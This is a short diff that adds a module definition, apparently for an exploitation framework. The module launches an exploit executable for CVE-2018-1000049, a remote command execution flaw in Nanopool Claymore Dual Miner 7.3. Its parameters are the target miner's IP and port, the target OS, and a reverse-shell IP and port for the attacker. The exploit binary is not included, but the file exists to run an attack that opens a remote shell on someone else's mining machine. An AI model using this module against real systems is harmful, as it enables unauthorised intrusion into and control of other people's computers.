@@ -1,0 +1,27 @@
+<bpf language=2.0>
+<method>inject</method>
+<connect>NR</connect>
+<sctype>yuan</sctype>
+
+<parameter1>Miner IP</parameter1>
+<parameter2>Miner PORT</parameter2>
+<parameter3>目标系统</parameter3>
+<parameter4>反弹IP</parameter4>
+<parameter5>反弹PORT</parameter5>
+
+<steps>1</steps>
+<step1>
+<cmd>2018-1000049.exe *<par1/>** *<par2/>** *<par3/>** *<par4/>** *<par5/>**</cmd>
+</step1>
+
+<help>
+
+CVE : 2018-1000049
+
+Nanopool Claymore Dual Miner 远程命令执行漏洞
+
+影响版本：7.3
+
+目标系统：windows linux
+
+</help>
